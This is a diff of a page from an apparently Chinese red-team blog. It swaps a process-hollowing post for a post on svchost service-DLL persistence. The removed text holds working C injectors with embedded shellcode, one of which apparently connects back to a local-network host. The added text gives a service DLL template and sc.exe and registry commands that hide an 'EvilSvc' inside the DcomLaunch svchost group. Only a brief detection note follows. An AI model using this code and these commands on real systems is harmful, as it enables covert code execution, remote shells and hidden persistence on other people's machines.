@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>傀儡进程 | 九世的博客</title>
+  <title>svchost.exe挂载DLL | 九世的博客</title>
   <meta name="keywords" content=" 红队 ">
-  <meta name="description" content="傀儡进程 | 九世的博客">
+  <meta name="description" content="svchost.exe挂载DLL | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="友链BGM:拔剑神曲   即刻安全 Hacking 木头的博客 hackhat社区 Xhong的博客">
 <meta property="og:type" content="website">
@@ -1924,9 +1924,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-傀儡进程" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-svchost-exe挂载DLL" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">傀儡进程</h1>
+        <h1 class="article-title">svchost.exe挂载DLL</h1>
     
     <div class="article-meta">
         
@@ -1942,7 +1942,7 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2021-04-06 23:36:34">2021-04-06 23:29</time>
+        创建时间:<time class="date" title="更新时间: 2022-01-16 01:35:56">2022-01-16 01:28</time>
         
     </div>
     <div class="article-meta">
@@ -1964,7 +1964,7 @@
     
     <div class="toc-ref">
     
-        
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#工作原理"><span class="toc-text">工作原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#实验过程"><span class="toc-text">实验过程</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1979,237 +1979,104 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <p><strong>shellcode插入</strong><br>x64<br>整体流程：<br>1.创建进程，获取进程句柄 CreateProcessA<br>2.在目标进程分配shellcode大小的内存空间 VirtualAllocEx<br>3.远程写入shellcode WriteProcessMemory<br>4.远程线程调用 CreateRemoteThread<br>5.等待返回 WaitForSingleObject<br>6.减少线程的挂起计数。当挂起计数减为零时，将继续执行线程。 ResumeThread</p>
-<p>ps:其实这个不算最多算个线程劫持</p>
-<pre><code class="c">#include &quot;stdafx.h&quot;
-#include &lt;Windows.h&gt;
-int main()
-{
-        unsigned char buf[] =
-               &quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52&quot;
-               &quot;\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48&quot;
-               &quot;\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9&quot;
-               &quot;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;
-               &quot;\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48&quot;
-               &quot;\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01&quot;
-               &quot;\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48&quot;
-               &quot;\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0&quot;
-               &quot;\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c&quot;
-               &quot;\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0&quot;
-               &quot;\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04&quot;
-               &quot;\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59&quot;
-               &quot;\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48&quot;
-               &quot;\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00&quot;
-               &quot;\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f&quot;
-               &quot;\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff&quot;
-               &quot;\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb&quot;
-               &quot;\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c&quot;
-               &quot;\x63\x2e\x65\x78\x65\x00&quot;;
-        SIZE_T size = 0;
-        STARTUPINFOEXA si;
-        PROCESS_INFORMATION pi;
-        ZeroMemory(&amp;si, sizeof(si));
-        si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
-        si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
-        ZeroMemory(&amp;pi, sizeof(pi));
+        <h2 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h2><p><img src="https://s4.ax1x.com/2022/01/16/7YH6o9.png" alt=""></p>
+<h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><p>vs新建类库编译个处理服务循环响用的DLL</p>
+<pre><code>#include &quot;pch.h&quot;
+#define SVCNAME TEXT(&quot;EvilSvc&quot;)
 
-        BOOL sucess = CreateProcessA(NULL, &quot;C:\\Windows\\System32\\notepad.exe&quot;, NULL,  NULL, true, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL,  (LPSTARTUPINFOA)&amp;si, &amp;pi);
-        HANDLE notepadHandle = pi.hProcess;
-        LPVOID remotebuffer = VirtualAllocEx(notepadHandle, NULL, sizeof(buf),  (MEM_RESERVE | MEM_COMMIT),PAGE_EXECUTE_READWRITE);
-        WriteProcessMemory(notepadHandle,remotebuffer,buf,sizeof(buf),NULL);
-        HANDLE remoteThread = CreateRemoteThread(notepadHandle, NULL, 0,  (LPTHREAD_START_ROUTINE)remotebuffer, NULL, 0, NULL); //remotebuffer为线程起始地址
-        if (WaitForSingleObject(remoteThread, INFINITE) == WAIT_FAILED) {
-               return 1;
-        }
-        if (ResumeThread(pi.hThread) == -1) {
-               return 1;
-        }
-    return 0;
-}
-</code></pre>
-<p><img src="https://z3.ax1x.com/2021/04/06/c3naLQ.png" alt=""></p>
-<p>x86<br>寻找加载基地址，在加载基地址前运行shellcode：<br>1.挂起方式创建进程 CreateProcessA<br>2.获取线程里的PEB GetThreadContext<br>3.获取进程基地址保存在EAX ReadProcessMemory<br>4.在基地址之前写入shellcode WriteProcessMemory<br>5.恢复线程执行 ResumeThread</p>
-<pre><code class="c">#include &quot;stdafx.h&quot;
-#include &lt;Windows.h&gt;
-unsigned char buf[] =
-&quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30&quot;
-&quot;\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff&quot;
-&quot;\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52&quot;
-&quot;\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1&quot;
-&quot;\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b&quot;
-&quot;\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03&quot;
-&quot;\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b&quot;
-&quot;\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24&quot;
-&quot;\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb&quot;
-&quot;\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c&quot;
-&quot;\x77\x26\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54&quot;
-&quot;\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x5d\x8d&quot;
-&quot;\x68\x02\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50&quot;
-&quot;\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5&quot;
-&quot;\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67&quot;
-&quot;\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff&quot;
-&quot;\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00&quot;
-&quot;\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56&quot;
-&quot;\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58&quot;
-&quot;\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5&quot;
-&quot;\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85&quot;
-&quot;\x70\xff\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1&quot;
-&quot;\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5&quot;;
-void test() {
-        STARTUPINFOA si;
-        PROCESS_INFORMATION pi;
-        ZeroMemory(&amp;si, sizeof(si));
-        ZeroMemory(&amp;pi, sizeof(pi));
-        si.cb = sizeof(STARTUPINFOA);
-        if (!CreateProcessA(&quot;C:\\Windows\\sysWoW64\\svchost.exe&quot;, NULL, NULL, NULL, FALSE,  CREATE_SUSPENDED, NULL, NULL, &amp;si, &amp;pi)) {
-               printf(&quot;CreateProcess Error Code:%d\n&quot;, GetLastError());
-               return;
-        }
-        printf(&quot;CreateProcess Sucess\n&quot;);
-        CONTEXT ctx;
-        ctx.ContextFlags = CONTEXT_ALL;
-        if (!GetThreadContext(pi.hThread, &amp;ctx)) {
-               printf(&quot;GetThreadContext Error Code:%d\n&quot;, GetLastError());
-               return;
-        }
-        printf(&quot;GetThreadContext Sucess\n&quot;);
-        DWORD dwImageBase = 0;
-        DWORD lpNumberOfBytesRead = 0;
-        if (!ReadProcessMemory(pi.hProcess, (LPCVOID)(ctx.Ebx + 0x8), &amp;dwImageBase,  sizeof(DWORD), &amp;lpNumberOfBytesRead)) {
-               printf(&quot;ReadProcessMemory Error Code:%d\n&quot;, GetLastError());
-               return;
-        }
-        printf(&quot;ReadProcessMemory Sucess\n&quot;);
-        DWORD NumberOfBytesWritten = 0;
-        if (!WriteProcessMemory(pi.hProcess, (LPVOID)ctx.Eax, buf, sizeof(buf),  &amp;NumberOfBytesWritten)) {
-               printf(&quot;WriteProcessMemory Error Code:%d\n&quot;);
-        }
-        printf(&quot;WriteProcessMemory Sucess\n&quot;);
-        if (ResumeThread(pi.hThread) == -1) { //恢复线程执行成功的话函数返回为0
-               printf(&quot;ResumeThread Error Code:%d\n&quot;,GetLastError());
-        }
-        printf(&quot;ResumeThread Sucess\n&quot;);
-}
-int main()
+
+SERVICE_STATUS serviceStatus;
+SERVICE_STATUS_HANDLE serviceStatusHandle;
+HANDLE stopEvent = NULL;
+
+
+VOID UpdateServiceStatus(DWORD currentState)
 {
-        test();
-        system(&quot;pause&quot;);
-    return 0;
+    serviceStatus.dwCurrentState = currentState;
+    SetServiceStatus(serviceStatusHandle, &amp;serviceStatus);
 }
-</code></pre>
-<p><img src="https://z3.ax1x.com/2021/04/06/c3n2yF.md.png" alt=""></p>
-<p><img src="https://z3.ax1x.com/2021/04/06/c3nhw9.png" alt=""></p>
-<p><strong>x86进程替换</strong><br>1.创建进程CreateProcessA<br>2.获取进程PEB地址GetThreadContext<br>3.读取文件获取文件句柄 CreateFileA #替换掉目标文件的恶意文件<br>4.获取文件大小 GetFileSize<br>5.定义一个恶意文件的大小内存空间<br>6.读取文件内容 ReadFile<br>7.获取恶意文件内容的DOS头 (PIMAGE_DOS_HEADER)pBuf<br>8.获取恶意文件内容的NT头 (PIMAGE_NT_HEADERS)(pBuf + pDosHeader-&gt;e_lfanew)<br>9.更改创建进程的基地址允许执行权限((LPVOID)pNtHeaders-&gt;OptionalHeader.ImageBase)<br>10.往进程内存写入恶意文件WriteProcessMemory(pi.hProcess,lpAddr,(LPCVOID)pBuf,pNtHeaders-&gt;OptionalHeader.SizeOfHeaders,NULL); //指向要写的数据的指针。<br>11.替换字节<br>12.替换PEB中基地址<br>13.替换入口点</p>
-<p>pDosHeader-&gt;e_lfanew DOS偏移头<br>pNtHeaders-&gt;OptionalHeader.ImageBase 基地址<br>pNtHeaders-&gt;OptionalHeader.SizeOfImage PE大小<br>pNtHeaders-&gt;FileHeader.NumberOfSections 节表大小<br> (LPVOID)((DWORD)lpAddr + pSectionHeader-&gt;VirtualAddress 节区的RVA地址<br> (LPCVOID)((DWORD)pBuf + pSectionHeader-&gt;PointerToRawData 在文件中的偏移<br>dwImageBase +  pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint 程序执行入口RVA</p>
-<pre><code class="c">#include &quot;stdafx.h&quot;
-#include &lt;Windows.h&gt;
-void test() {
-        CHAR test[MAX_PATH] = &quot;C:\\Windows\\SysWOW64\\explorer.exe&quot;;
-        CHAR test2[MAX_PATH] = &quot;C:\\windows\\SysWOW64\\calc.exe&quot;;
-        STARTUPINFOA si;
-        PROCESS_INFORMATION pi;
-        ZeroMemory(&amp;si, sizeof(si));
-        ZeroMemory(&amp;pi, sizeof(pi));
-        if (!CreateProcessA(test, NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &amp;si, &amp;pi)) {
-               printf(&quot;CreateProcess Error:%d\n&quot;,GetLastError());
-               return;
-        }
-        printf(&quot;CreateProcess Sucess\n&quot;);
-        CONTEXT ctx;
-        ctx.ContextFlags = CONTEXT_ALL;
-        if (!GetThreadContext(pi.hThread, &amp;ctx)) {
-               printf(&quot;GetThreadContext Error Code:%d\n&quot;, GetLastError());
-               return;
-        }
-        printf(&quot;GetThreadContext Sucess\n&quot;);
-        HANDLE hFile = CreateFileA(test2, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE  | FILE_SHARE_DELETE,
-               NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-        if (hFile == INVALID_HANDLE_VALUE)
-        {
-               printf(&quot;Open EXE File Filed&quot;);
-               printf(&quot;%d&quot;, GetLastError());
-               return;
-        }
-        DWORD dwSize = GetFileSize(hFile, NULL);
-        LPBYTE pAllocPE = NULL;
-        PBYTE pBuf = (PBYTE)malloc(dwSize);
-        DWORD dwBytesRead = 0;
-        ReadFile(hFile, (LPVOID)pBuf, dwSize, &amp;dwBytesRead, NULL);
-        PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBuf;
-        PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pBuf + pDosHeader-&gt;e_lfanew);
-        //2.获取进程上下文
-        CONTEXT stThreadContext;
-        stThreadContext.ContextFlags = CONTEXT_FULL;
-        if (GetThreadContext(pi.hThread, &amp;stThreadContext) == 0)
-        {
-               printf(&quot;CreateProcess failed (%d).\n&quot;, GetLastError());
-               return;
-        }
-        void* lpAddr = VirtualAllocEx(pi.hProcess,  (LPVOID)pNtHeaders-&gt;OptionalHeader.ImageBase,
-               pNtHeaders-&gt;OptionalHeader.SizeOfImage,
-               MEM_COMMIT | MEM_RESERVE,
-               PAGE_EXECUTE_READWRITE);//用Imagebase为起始地址避免了重定位。
-        if (lpAddr == NULL)
-        {
-               printf(&quot;VirtualAlloc failed (%d).\n&quot;, GetLastError());
-               return;
-        }
-        BOOL bRet = WriteProcessMemory(pi.hProcess,
-               lpAddr,
-               (LPCVOID)pBuf,//指向要写的数据的指针。
-               pNtHeaders-&gt;OptionalHeader.SizeOfHeaders,
-               NULL);
-        if (!bRet)
-        {
-               return ;
-        }
-        // 替换节
-        LPVOID lpSectionBaseAddr = (LPVOID)((DWORD)pBuf
-               + pDosHeader-&gt;e_lfanew + sizeof(IMAGE_NT_HEADERS));
-        PIMAGE_SECTION_HEADER pSectionHeader;
-        DWORD dwIndex = 0;
-        for (; dwIndex &lt; pNtHeaders-&gt;FileHeader.NumberOfSections; ++dwIndex)
-        {
-               pSectionHeader = (PIMAGE_SECTION_HEADER)lpSectionBaseAddr;
-               bRet = WriteProcessMemory(pi.hProcess,
-                       (LPVOID)((DWORD)lpAddr + pSectionHeader-&gt;VirtualAddress),
-                       (LPCVOID)((DWORD)pBuf + pSectionHeader-&gt;PointerToRawData),
-                       pSectionHeader-&gt;SizeOfRawData,
-                       NULL);
-               if (!bRet)
-               {
-                       return;
-               }
-               lpSectionBaseAddr = (LPVOID)((DWORD)lpSectionBaseAddr +  sizeof(IMAGE_SECTION_HEADER));
-        }
-        //6.恢复现场并运行傀儡进程
-        // 替换PEB中基地址
-        DWORD dwImageBase = pNtHeaders-&gt;OptionalHeader.ImageBase;
-        bRet = WriteProcessMemory(pi.hProcess, (LPVOID)(stThreadContext.Ebx + 8),  (LPCVOID)&amp;dwImageBase, sizeof(PVOID), NULL);
-        if (!bRet)
-        {
-               return;
-        }
-        // 替换入口点
-        stThreadContext.Eax = dwImageBase +  pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint;
-        bRet = SetThreadContext(pi.hThread, &amp;stThreadContext);
-        if (!bRet)
-        {
-               return;
-        }
-        ResumeThread(pi.hThread);
-        printf(&quot;PID: %d&quot;, pi.dwProcessId);
-        free(pBuf);
-}
-int main()
+
+
+DWORD ServiceHandler(DWORD controlCode, DWORD eventType, LPVOID eventData, LPVOID context)
 {
-        test();
-        system(&quot;pause&quot;);
-        return 0;
+    switch (controlCode)
+    {
+        case SERVICE_CONTROL_STOP:
+            serviceStatus.dwCurrentState = SERVICE_STOPPED;
+            SetEvent(stopEvent);
+            break;
+        case SERVICE_CONTROL_SHUTDOWN:
+            serviceStatus.dwCurrentState = SERVICE_STOPPED;
+            SetEvent(stopEvent);
+            break;
+        case SERVICE_CONTROL_PAUSE:
+            serviceStatus.dwCurrentState = SERVICE_PAUSED;
+            break;
+        case SERVICE_CONTROL_CONTINUE:
+            serviceStatus.dwCurrentState = SERVICE_RUNNING;
+            break;
+        case SERVICE_CONTROL_INTERROGATE:
+            break;
+        default:
+            break;
+    }
+
+
+    UpdateServiceStatus(SERVICE_RUNNING);
+
+
+    return NO_ERROR;
 }
-</code></pre>
-<p><img src="https://z3.ax1x.com/2021/04/06/c3nXeH.png" alt=""></p>
-<p>x64傀儡进程参考：<a href="https://bbs.pediy.com/thread-253362.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-253362.htm</a><br>EXE替换参考：<a href="https://jev0n.com/2020/03/11/65.html" target="_blank" rel="noopener">https://jev0n.com/2020/03/11/65.html</a></p>
+
+
+VOID ExecuteServiceCode()
+{
+    stopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
+    UpdateServiceStatus(SERVICE_RUNNING);
+
+
+    // #####################################
+    // your persistence code here
+    // #####################################
+
+
+    while (1)
+    {
+        WaitForSingleObject(stopEvent, INFINITE);
+        UpdateServiceStatus(SERVICE_STOPPED);
+        return;
+    }
+}
+
+
+extern &quot;C&quot; __declspec(dllexport) VOID WINAPI ServiceMain(DWORD argC, LPWSTR * argV)
+{
+    serviceStatusHandle = RegisterServiceCtrlHandler(SVCNAME, (LPHANDLER_FUNCTION)ServiceHandler);
+
+
+    serviceStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
+    serviceStatus.dwServiceSpecificExitCode = 0;
+
+
+    UpdateServiceStatus(SERVICE_START_PENDING);
+    ExecuteServiceCode();
+}
+</code></pre><p>创建EvilSvc服务</p>
+<pre><code>sc.exe create EvilSvc binPath= &quot;c:\windows\System32\svchost.exe -k DcomLaunch&quot; type= share start= auto
+</code></pre><p>修改EvilSvc DLL路径为自己的DLL路径</p>
+<pre><code>reg add HKLM\SYSTEM\CurrentControlSet\services\EvilSvc\Parameters /v ServiceDll /t REG_EXPAND_SZ /d C:\Windows\system32\EvilSvc.dll /f
+</code></pre><p>注册表查看该服务如下<br><img src="https://s4.ax1x.com/2022/01/16/7YHWz6.png" alt=""></p>
+<p><img src="https://s4.ax1x.com/2022/01/16/7YH4sO.png" alt=""></p>
+<p>修改svchost组里的DcomLaunch<br>（添加创建的服务名）<br><img src="https://s4.ax1x.com/2022/01/16/7YH5LD.png" alt=""></p>
+<p>启动EvilSvc服务</p>
+<pre><code>sc start EvilSvc
+</code></pre><p><img src="https://s4.ax1x.com/2022/01/16/7YHoee.png" alt=""></p>
+<p><img src="https://s4.ax1x.com/2022/01/16/7YH7od.png" alt=""></p>
+<p>检测技术</p>
+<pre><code>* 最近创建的服务svchost.exe作为binPath
+* 列出所有系统服务的ServiceDLL值并检测
+</code></pre><pre><code>Get-ItemProperty hklm:\SYSTEM\ControlSet001\Services\*\Parameters | ? { $_.servicedll } | select psparentpath, servicedll
+</code></pre><p><img src="https://s4.ax1x.com/2022/01/16/7YHXSP.png" alt=""></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -2219,12 +2086,12 @@ int main()
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>傀儡进程</p>
+    <p><span class="copy-title">文章标题:</span>svchost.exe挂载DLL</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2021-04-06, 23:29:53</p>
-    <p><span class="copy-title">最后更新:</span>2021-04-06, 23:36:34</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/96bf6a75.html" title="傀儡进程">http://422926799.github.io/posts/96bf6a75.html</a>
+    <p><span class="copy-title">发布时间:</span>2022-01-16, 01:28:39</p>
+    <p><span class="copy-title">最后更新:</span>2022-01-16, 01:35:56</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/3047149d.html" title="svchost.exe挂载DLL">http://422926799.github.io/posts/3047149d.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
